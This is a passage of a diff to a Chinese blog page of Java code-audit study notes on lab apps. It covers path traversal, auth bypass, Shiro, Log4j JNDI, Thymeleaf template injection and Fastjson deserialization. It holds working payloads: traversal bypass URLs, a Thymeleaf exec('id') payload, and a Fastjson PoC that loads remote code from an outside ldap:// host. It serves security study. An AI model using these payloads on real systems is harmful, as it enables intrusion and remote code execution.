+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A113.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>发现传入的值是rootpath与path的值的拼接</p>
 </li>
@@ -460,7 +460,7 @@
 <li><p>同样是使用..&#x2F;跳到上一级的原理</p>
 </li>
 <li><pre><code class="language-url">/image//image..//image..//image..//image..//image..//1.txt
-<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs processing"><br>  - 根据源代码，/<span class="hljs-built_in">image</span>会被替换为空<br><br>  - 只有url中加上/<span class="hljs-built_in">image</span>才能正常执行，具体原因未知<br><br>### 鉴权 未授权访问<br><br>[Java代码审计&amp;鉴权漏洞&amp;Interceptor&amp;Filter&amp;Shiro&amp;JWT_java鉴权-CSDN博客](https:<span class="hljs-comment">//blog.csdn.net/qq_46081990/article/details/135207986)</span><br><br><span class="hljs-number">1.</span> 过滤器               -- 逻辑安全问题<br><span class="hljs-number">2.</span> 自定义代码       -- 逻辑安全问题<br><span class="hljs-number">3.</span> shiro框架验证  -- 找shiro版本漏洞<br><br>- 鉴权使用的框架，拦截器，过滤器等<br><br>  ![](E:\a网安\笔记\java\java审计<span class="hljs-number">14.</span>png)<br>  <br>  拦截器一般流程<br>  <br>  ![](E:\a网安\笔记\java\java审计<span class="hljs-number">15.</span>png)<br><br>#### 挖掘点<br><br><span class="hljs-number">1.</span> 拦截器中是否鉴权<br><span class="hljs-number">2.</span> 过滤器中是否鉴权<br><span class="hljs-number">3.</span> Shiro版本及其逻辑配置<br><span class="hljs-number">4.</span> 有无JWT<br><span class="hljs-number">5.</span> 以上都没有，查找是否是自写代码鉴权<br><br>#### Newbee案例(拦截器)<br><br>- 确定鉴权使用的是哪种模式<br>  - 在pom.<span class="hljs-property">xml</span>文件中搜索jwt和shiro关键字，发现并没有这两种依赖的导入<br>  - 继续通过翻看目录确定是过滤器还是拦截器<br>  - 翻看过程中发现有intercepetor目录<br>  <br>- 确定使用拦截器鉴权<br><br>- 拦截器鉴权一般写在preHandle方法内<br><br>  ```java<br>  <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span>(HttpServletRequest request, HttpServletResponse response, <span class="hljs-built_in">Object</span> o) <span class="hljs-keyword">throws</span> Exception &#123;<br>      <span class="hljs-comment">// 获取当前请求的路径</span><br>      <span class="hljs-built_in">String</span> requestServletPath = request.<span class="hljs-property">getServletPath</span>();<br>      <br>      <span class="hljs-comment">// 检查请求路径是否以&quot;/admin&quot;开头且会话中没有&quot;loginUser&quot;属性（即用户未登录）</span><br>      <span class="hljs-keyword">if</span> (requestServletPath.<span class="hljs-property">startsWith</span>(<span class="hljs-string">&quot;/admin&quot;</span>) &amp;&amp; <span class="hljs-literal">null</span> == request.<span class="hljs-property">getSession</span>().<span class="hljs-property">getAttribute</span>(<span class="hljs-string">&quot;loginUser&quot;</span>)) &#123;<br>          <span class="hljs-comment">// 设置错误消息到会话中</span><br>          request.<span class="hljs-property">getSession</span>().<span class="hljs-property">setAttribute</span>(<span class="hljs-string">&quot;errorMsg&quot;</span>, <span class="hljs-string">&quot;请登陆&quot;</span>);<br>          <span class="hljs-comment">// 重定向到管理员登录页面</span><br>          response.<span class="hljs-property">sendRedirect</span>(request.<span class="hljs-property">getContextPath</span>() + <span class="hljs-string">&quot;/admin/login&quot;</span>);<br>          <span class="hljs-comment">// 返回false表示中断请求继续执行</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// 如果已登录或非admin路径请求，则清除可能的错误消息</span><br>          request.<span class="hljs-property">getSession</span>().<span class="hljs-property">removeAttribute</span>(<span class="hljs-string">&quot;errorMsg&quot;</span>);<br>          <span class="hljs-comment">// 返回true允许请求继续执行</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs processing"><br>  - 根据源代码，/<span class="hljs-built_in">image</span>会被替换为空<br><br>  - 只有url中加上/<span class="hljs-built_in">image</span>才能正常执行，具体原因未知<br><br>### 鉴权 未授权访问<br><br>[Java代码审计&amp;鉴权漏洞&amp;Interceptor&amp;Filter&amp;Shiro&amp;JWT_java鉴权-CSDN博客](https:<span class="hljs-comment">//blog.csdn.net/qq_46081990/article/details/135207986)</span><br><br><span class="hljs-number">1.</span> 过滤器               -- 逻辑安全问题<br><span class="hljs-number">2.</span> 自定义代码       -- 逻辑安全问题<br><span class="hljs-number">3.</span> shiro框架验证  -- 找shiro版本漏洞<br><br>- 鉴权使用的框架，拦截器，过滤器等<br><br>  ![](<span class="hljs-built_in">image</span>\java审计<span class="hljs-number">14.</span>png)<br>  <br>  拦截器一般流程<br>  <br>  ![](<span class="hljs-built_in">image</span>\java审计<span class="hljs-number">15.</span>png)<br><br>#### 挖掘点<br><br><span class="hljs-number">1.</span> 拦截器中是否鉴权<br><span class="hljs-number">2.</span> 过滤器中是否鉴权<br><span class="hljs-number">3.</span> Shiro版本及其逻辑配置<br><span class="hljs-number">4.</span> 有无JWT<br><span class="hljs-number">5.</span> 以上都没有，查找是否是自写代码鉴权<br><br>#### Newbee案例(拦截器)<br><br>- 确定鉴权使用的是哪种模式<br>  - 在pom.<span class="hljs-property">xml</span>文件中搜索jwt和shiro关键字，发现并没有这两种依赖的导入<br>  - 继续通过翻看目录确定是过滤器还是拦截器<br>  - 翻看过程中发现有intercepetor目录<br>  <br>- 确定使用拦截器鉴权<br><br>- 拦截器鉴权一般写在preHandle方法内<br><br>  ```java<br>  <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span>(HttpServletRequest request, HttpServletResponse response, <span class="hljs-built_in">Object</span> o) <span class="hljs-keyword">throws</span> Exception &#123;<br>      <span class="hljs-comment">// 获取当前请求的路径</span><br>      <span class="hljs-built_in">String</span> requestServletPath = request.<span class="hljs-property">getServletPath</span>();<br>      <br>      <span class="hljs-comment">// 检查请求路径是否以&quot;/admin&quot;开头且会话中没有&quot;loginUser&quot;属性（即用户未登录）</span><br>      <span class="hljs-keyword">if</span> (requestServletPath.<span class="hljs-property">startsWith</span>(<span class="hljs-string">&quot;/admin&quot;</span>) &amp;&amp; <span class="hljs-literal">null</span> == request.<span class="hljs-property">getSession</span>().<span class="hljs-property">getAttribute</span>(<span class="hljs-string">&quot;loginUser&quot;</span>)) &#123;<br>          <span class="hljs-comment">// 设置错误消息到会话中</span><br>          request.<span class="hljs-property">getSession</span>().<span class="hljs-property">setAttribute</span>(<span class="hljs-string">&quot;errorMsg&quot;</span>, <span class="hljs-string">&quot;请登陆&quot;</span>);<br>          <span class="hljs-comment">// 重定向到管理员登录页面</span><br>          response.<span class="hljs-property">sendRedirect</span>(request.<span class="hljs-property">getContextPath</span>() + <span class="hljs-string">&quot;/admin/login&quot;</span>);<br>          <span class="hljs-comment">// 返回false表示中断请求继续执行</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// 如果已登录或非admin路径请求，则清除可能的错误消息</span><br>          request.<span class="hljs-property">getSession</span>().<span class="hljs-property">removeAttribute</span>(<span class="hljs-string">&quot;errorMsg&quot;</span>);<br>          <span class="hljs-comment">// 返回true允许请求继续执行</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>
 </code></pre>
 </li>
 </ul>
@@ -470,7 +470,7 @@
 <li><p>利用方式：构造路径为&#x2F;;&#x2F;admin或&#x2F;&#x2F;admin后访问</p>
 </li>
 <li><p>实操发现页面显示404，猜测是与浏览器有关</p>
-<p><img src="E:\a网安\笔记\java\java审计16.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A116.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ul>
 <h4 id="华夏ERP案例-过滤器"><a href="#华夏ERP案例-过滤器" class="headerlink" title="华夏ERP案例(过滤器)"></a>华夏ERP案例(过滤器)</h4><ul>
@@ -484,7 +484,7 @@
 <p>利用白名单过滤绕过鉴权</p>
 </li>
 <li><p>抓包，在数据包url处更改</p>
-<p><img src="E:\a网安\笔记\java\java审计17.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A117.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">/login.html/../account/getAccount     =  /account/getAccount <br>/register.html/../account/getAccount  =  /account/getAccount <br>/a.js/../account/getAccount           =  /account/getAccount  <br>/user/login/../../account/getAccount  =  /account/getAccount <br></code></pre></td></tr></table></figure></li>
 </ul>
 <h4 id="Tumo案例-Shiro"><a href="#Tumo案例-Shiro" class="headerlink" title="Tumo案例(Shiro)"></a>Tumo案例(Shiro)</h4><ul>
@@ -515,7 +515,7 @@
 <p>或：数据包中存在jwt特征：两个点将token分解为三段</p>
 </li>
 <li><p>检查密钥是否修改</p>
-<p><img src="E:\a网安\笔记\java\java审计18.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A118.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>越权实例：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/thebeastofwar/p/17920565.html">Nacos漏洞复现总结 - BattleofZhongDinghe - 博客园 (cnblogs.com)</a></p>
 </li>
@@ -535,7 +535,7 @@
 </ul>
 </li>
 <li><p>全局搜索关键字后，继续寻找有可控变量的地方，才有利用点</p>
-<p><img src="E:\a网安\笔记\java\java审计19.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A119.png" srcset="/img/loading.gif" lazyload></p>
 <p>找到此代码并且发现此变量可控，确定此处为漏洞触发点</p>
 </li>
 <li><p>搭建好环境后通过代码可以判断漏洞利用点在添加商品功能处</p>
@@ -544,12 +544,12 @@
 <p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/liguangyao213/article/details/123929296">Fastjson反序列化审计及验证_fastjson 1.2.58漏洞-CSDN博客</a></p>
 <p>使用dns平台：{“@type”:”java.net.Inet4Address”,”val”:”3042zb.dnslog.cn”}</p>
 <p>在实操过程中有500报错</p>
-<p><img src="E:\a网安\笔记\java\java审计20.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A120.png" srcset="/img/loading.gif" lazyload></p>
 <p>原因</p>
-<p><img src="E:\a网安\笔记\java\java审计21.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A121.png" srcset="/img/loading.gif" lazyload></p>
 <p>视频演示时可以收到访问请求</p>
 <p>后续查看时发现bp自带的测试地址收到了访问请求</p>
-<p><img src="E:\a网安\笔记\java\java审计22.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A122.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ul>
 <h4 id="Tmall-Log4j-2-10-0"><a href="#Tmall-Log4j-2-10-0" class="headerlink" title="Tmall-Log4j   2.10.0"></a>Tmall-Log4j   2.10.0</h4><ul>
@@ -561,7 +561,7 @@
 <li><p>搜索关键字(触发点) ：logger.error  logger.info</p>
 </li>
 <li><p>在诸多结果中寻找带有可控变量的</p>
-<p><img src="E:\a网安\笔记\java\Java审计23.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5CJava%E5%AE%A1%E8%AE%A123.png" srcset="/img/loading.gif" lazyload></p>
 <p>可以通过更改图片上传的文件名更改参数值</p>
 </li>
 <li><p>利用jndi注入</p>
@@ -582,7 +582,7 @@
 <li><p>在源代码中直接查找key</p>
 <ul>
 <li><p>搜索关键字setCipherKey，找到shiro密钥</p>
-<p><img src="E:\a网安\笔记\java\java审计24.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A124.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ul>
 </li>
@@ -594,7 +594,7 @@
 <h5 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h5><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/231909.html">Shiro权限绕过漏洞分析（CVE-2020-1957） - FreeBuf网络安全行业门户</a></p>
 <ul>
 <li><p>shiro的一般规则</p>
-<p><img src="E:\a网安\笔记\java\java审计25.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A125.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>找到ShiroConfig.java文件查看允许匿名访问的目录</p>
 </li>
@@ -608,10 +608,10 @@
 <li><p>访问页面<a target="_blank" rel="noopener" href="http://localhost:8090/h2-console">http://localhost:8090/h2-console</a></p>
 </li>
 <li><p>利用jndi注入工具生成poc</p>
-<p><img src="E:\a网安\笔记\java\java审计26.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A126.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>传值</p>
-<p><img src="E:\a网安\笔记\java\java审计27.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A127.png" srcset="/img/loading.gif" lazyload></p>
 <p>javax.naming.InitialContext</p>
 <p>注入使用的poc</p>
 </li>
@@ -627,13 +627,13 @@
 </ol>
 <ul>
 <li><p>常见模板引擎</p>
-<p><img src="E:\a网安\笔记\java\java审计28.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A128.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ul>
 <h4 id="Halo案例-FreeMarker模板"><a href="#Halo案例-FreeMarker模板" class="headerlink" title="Halo案例(FreeMarker模板)"></a>Halo案例(FreeMarker模板)</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/16217471.html">Java安全之freemarker 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
 <ul>
 <li><p>全局搜索关键字freemarker,发现源代码中有freemarker的配置</p>
-<p><img src="E:\a网安\笔记\java\java审计29.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A129.png" srcset="/img/loading.gif" lazyload></p>
 <p>发现FreeMarker的配置文件是 .ftl后缀   </p>
 </li>
 <li><p>修改resources\templates\themes\anatole\index.ftl文件</p>
@@ -655,7 +655,7 @@
 <li><p>搜索关键字发现是Thymeleaf模板</p>
 </li>
 <li><p>找入口(寻找与文章中类似的return入口)</p>
-<p><img src="E:\a网安\笔记\java\java审计30.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A130.png" srcset="/img/loading.gif" lazyload></p>
 <p>存在可控变量的return入口</p>
 </li>
 <li><p>找到路由 </p>
@@ -664,7 +664,7 @@
 <li><p>抓取数据包后更改变量fragment的值，传入payload</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">__$&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>).getInputStream()).next()&#125;__::.x<br></code></pre></td></tr></table></figure>
 
-<p><img src="E:\a网安\笔记\java\java审计31.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A131.png" srcset="/img/loading.gif" lazyload></p>
 <p>成功弹出计算器</p>
 </li>
 </ul>
@@ -706,7 +706,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//触发fastjson反序列化用到JSON.parseObject,JSON.parse()</span><br><br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:31&#125;&quot;</span>;<br>        String userStr=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.kuang.fastjson.demos.web.User\&quot;,\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:21&#125;&quot;</span>;<br>        String poc=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://172.31.80.1:1389/fjfljn\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> JSON.parseObject(poc);<br>        System.out.println(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>成功弹出计算器！！！</p>
-<p><img src="E:\a网安\笔记\java\java审计32.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A132.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>反序列化原理分析</p>
 <ul>
@@ -716,10 +716,10 @@
 </li>
 <li><p>调用setAutoCommit方法时调用了 connect方法，connect方法中调用了lookup()方法</p>
 <p>控制注入核心触发代码</p>
-<p><img src="E:\a网安\笔记\java\java审计33.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A133.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>分析过程</p>
-<p><img src="E:\a网安\笔记\java\java审计34.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A134.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ul>
 </li>
@@ -736,12 +736,12 @@
 
 <p>在原poc包名前加上L，后面加;</p>
 <p>即可弹出计算器</p>
-<p><img src="E:\a网安\笔记\java\java审计35.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A135.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>发掘两步骤的原因</p>
 <ul>
 <li><p>前加L，后加；，用于绕过黑名单，后续有方法去除L与；</p>
-<p><img src="E:\a网安\笔记\java\java审计36.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A136.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>开启autoType</p>
 <p>断点调试后发现，如果不开启autoType，不会匹配白名单，会直接爆出autoType is not support</p>
@@ -789,7 +789,7 @@
 <li><p>在返回包中找到cookie关键字为rememberMe</p>
 </li>
 <li><p>通过关键字爆破密钥并检测</p>
-<p><img src="E:\a网安\笔记\java\java审计37.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A137.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>漏洞分析</p>
 </li>
@@ -811,7 +811,7 @@
 </ul>
 </li>
 <li><p>调试时发现的AES加密密钥</p>
-<p><img src="E:\a网安\笔记\java\java审计38.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A138.png" srcset="/img/loading.gif" lazyload></p>
 <p>key数组可利用python脚本还原为原密钥字符串</p>
 </li>
 <li><p>shiro反序列化无法利用fastjson的利用链</p>
@@ -821,7 +821,7 @@
 <li><p>fastjson利用方法：调用JdbcRowSetImpl类，通过set，get方法触发lookup方法传参(反序列化自定义方法)，远程调用脚本</p>
 </li>
 <li><p>shiro反序列化：利用原生反序列化函数：readObject  writeObject  ObjectInputStream(漏洞点)</p>
-<p><img src="E:\a网安\笔记\java\java审计39.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A139.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>shiro可能有JdbcRowSetImpl类，不满足触发set，get条件</p>
 </li>
@@ -830,7 +830,7 @@
 </ul>
 </li>
 <li><p>利用工具使用利用链执行命令，成功弹出计算器</p>
-<p><img src="E:\a网安\笔记\java\java审计40.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A140.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ul>
 <h4 id="cc利用链分析"><a href="#cc利用链分析" class="headerlink" title="cc利用链分析"></a>cc利用链分析</h4><ul>
@@ -917,7 +917,7 @@
 </ol>
 </li>
 <li><p>jndi注入的版本限制</p>
-<p><img src="E:\a网安\笔记\java\java审计41.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A141.png" srcset="/img/loading.gif" lazyload></p>
 <p>高版本无法注入的原因：</p>
 <ul>
 <li><p>com.sun.jndi.rmi.object.trustURLCodebase，</p>
@@ -969,7 +969,7 @@
 </ul>
 <h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><ul>
 <li><p>web代码执行流程</p>
-<p><img src="E:\a网安\笔记\java\java审计42.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/image%5Cjava%E5%AE%A1%E8%AE%A142.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p>servlet层触发的方法</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//有请求必触发的方法</span><br>requestInitialized<br>requestDestroyed    <br></code></pre></td></tr></table></figure>
@@ -1050,7 +1050,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
+      <div>Java代码审计</div>
       <div>http://example.com/2025/05/27/Java代码审计/</div>
     </div>
     <div class="license-meta">
@@ -1203,7 +1203,7 @@
     <div class="footer-inner">
   
     <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+       <a href="https://Hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://huang-d1.github.io" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
     </div>
   
   
